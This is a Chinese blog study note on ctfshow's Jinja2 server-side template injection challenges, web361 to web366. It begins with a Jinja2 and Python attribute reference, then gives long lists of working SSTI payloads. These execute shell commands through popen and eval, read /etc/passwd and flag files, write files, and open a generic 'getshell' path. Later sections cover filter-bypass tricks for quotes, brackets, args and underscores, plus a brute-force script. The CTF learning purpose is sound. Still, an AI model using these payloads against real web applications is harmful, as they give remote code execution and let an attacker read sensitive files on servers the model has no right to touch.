---
title: ctfshow ssti
date: 2024-11-24 15:26:46
tags:
      - ctfshow
      - ssti
categories: 学习笔记
---

## 前提

我们参考

[jinja官方文档](https://jinja.palletsprojects.com/en/2.11.x/templates/)
		[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)
		[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)

我们了解

**代码块**

```
变量块 {{}}	用于将表达式打印到模板输出
注释块 {##}	注释
控制块	{%%}	可以声明变量，也可以执行语句
行声明	##		可以有和{%%}相同的效果

```

常用方法

```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>

```

常用的过滤器

```


int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count

```





![模板注入](https://img-blog.csdnimg.cn/20210602163624805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU1MTA5NDUy,size_16,color_FFFFFF,t_70)

**这幅图的含义**是通过这些指令去判断对方用的是什么模板，下面解释一下这幅图的意思:
我们可以看到有红色剪头和绿色箭头，绿色是执行成功，红色是执行失败。
首先是注入

```
${7＊7}没有回显出49的情况，这种时候就是执行失败走红线，再次注入{{7＊7}}如果还是没有回显49就代表这里没有模板注入；如果注入{{7＊7}}回显了49代表执行成功，继续往下走注入{{7＊'7'}}，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。
然后回到最初注入${7＊7}成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{＊comment＊}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${"z".join("ab")}，如果执行成功回显出zab就说明是Mako模板。
```

原文链接：https://blog.csdn.net/2301_76690905/article/details/134253961



{{7*7}}=49 为Twig模块

{{7*‘7’}}，返回7777777表示jinja2模块

Smarty模板注入：（我这里做笔记的时候全用的if语句就不改了）

```
{if phpinfo()}{/if}
{if readfile(‘文件路劲’)}{/if}
{if show_source(‘文件路径’)}{/if}
{if passthru(‘操作命令’)}{/if}
{if system(‘操作命令’)}{/if}
等等等等等等等等。。。。。。......
```

Jinja2:


```
  Python2:
#(system函数换为popen('').read()，需要导入os模块)  
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
#(不需要导入os模块，直接从别的模块调用)
{{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
#常用的py2 EXP
().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
```

```
  Python3:
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval'("__import__('os').popen('id').read()")}}
```

Twig:

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```
#读取文件类，<type ‘file’> file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()}}
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}} (python3)


#直接使用popen命令，python2是非法的，只限于python3
os._wrap_close 类里有popen
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}


#调用os的popen执行命令
#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
#python3专属
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}


#调用eval函数读取
#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
{{"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}
#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}} 
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
{{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


#调用 importlib类
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}


#调用linecache函数
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


#调用communicate()函数
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}


#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')}}  ----python2的str类型不直接从属于基类，所以payload中含有两个 .__bases__
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write('123456')}}


#通用 getshell
原理：找到含有 __builtins__ 的类，利用即可。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

```



## web361

题目提示名字是注入点

我们get方式传name

```
?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```

利用的是os._wrap_close类，得到flag



## web362

题目提示过滤了

我们尝试了一下过滤了2、3等数字，os._wrap_close这个类没法使用

我们通过`__global__`属性直接调用`__builtins__`模块的eval函数

```
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```



## web363 -过滤単双引号

这题过滤了单引号和双引号

我们可以用

**get传参方式绕过**

```
?name={{lipsum.__globals__.os.popen(request.args.ocean).read()}}&ocean =cat /flag
?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag

```

**字符串拼接绕过**（演示部分）

```
(config.__str__()[2])
(config.__str__()[42])	

?name={{url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]}}
等于
?name={{url_for.__globals__['os']}}

```

**通过chr拼接**

先找出chr函数，通过chr拼接

```
?name={% set chr=url_for.__globals__.__builtins__.chr %}{% print  url_for.__globals__[chr(111)%2bchr(115)]%}

```



## web364 -过滤args

这题过滤了args和单双引号

**values 可以获取所有参数，从而绕过 args**

```
?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
```

我们可以**用cookie绕过**

```
?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}

cookie: a=os;b=popen;c=cat /flag
```

## 字符串构造

**拼接**

```
"cla"+"ss"
```

​	**反转**

```
"__ssalc__"[::-1]
```

但是实际上我发现其实加号是多余的，在jinjia2里面，"cla""ss"是等同于"class"的，也就是说我们可以这样引用class，并且绕过字符串过滤

```
""["__cla""ss__"]
"".__getattribute__("__cla""ss__")
""["__ssalc__"[::-1]]
"".__getattribute__("__ssalc__"[::-1])
```

**ascii转换**

```
"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

**编码绕过**

```
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
对于python2的话，还可以利用base64进行绕过
"__class__"==("X19jbGFzc19f").decode("base64")
```

**利用chr函数**

```
因为我们没法直接使用chr函数，所以需要通过__builtins__找到他

{% set chr=url_for.__globals__['__builtins__'].chr %}
{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
```

**在jinja2里面可以利用~进行拼接**

```
{%set a='__cla' %}{%set b='ss__'%}{{""[a~b]}}
```

   **大小写转换**

```
""["__CLASS__".lower()]
```

​	**利用过滤器**

```
('__clas','s__')|join
["__CLASS__"|lower
"__claee__"|replace("ee","ss") 
"__ssalc__"|reverse
"%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)


(()|select|string)[24]~
(()|select|string)[24]~
(()|select|string)[15]~
(()|select|string)[20]~
(()|select|string)[6]~
(()|select|string)[18]~
(()|select|string)[18]~
(()|select|string)[24]~
(()|select|string)[24]

dict(__clas=a,s__=b)|join
```

**获取键值或下标**

```
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

**获取属性**

```
().__class__
()["__class__"]
()|attr("__class__")
().__getattribute__("__class__")
```

字符串构造**https://blog.csdn.net/miuzzx/article/details/110220425**



## web365 -过滤中括号

我们用fuzz字典跑一遍，发现过滤了单双引号、args、[]

方法一： **values传参**

```
# values 没有被过滤
?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag

```

方法二：**cookie传参**

```
# cookie 可以使用
?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie:c=cat /flag

```

方法三：**字符串拼接**

中括号可以拿点绕过或者`__getitem__`等绕过都可以

通过`__getitem__()`构造任意字符，比如

```
?name={{config.__str__().__getitem__(22)}}   # 就是22
```

python脚本

```
# anthor:秀儿
import requests
url="http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name={{config.__str__().__getitem__(%d)}}"

payload="cat /flag"
result=""
for j in payload:
    for i in range(0,1000):
        r=requests.get(url=url%(i))
        location=r.text.find("<h3>")
        word=r.text[location+4:location+5]
        if word==j:
            print("config.__str__().__getitem__(%d) == %s"%(i,j))
            result+="config.__str__().__getitem__(%d)~"%(i)
            break
print(result[:len(result)-1])

```

```
?name={{url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)
).read()}}

```



## web366 -过滤了下划线

过滤了单双引号、args、中括号[]、下划线

**传参绕过检测**

**values版**

```
?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
```

因为后端只检测name传参的部分，所以其它部分就可以传入任意字符，和rce绕过一样

```
?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read

```

**cookie简化版**

```
?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}

cookie:a=__globals__;b=cat /flag

```

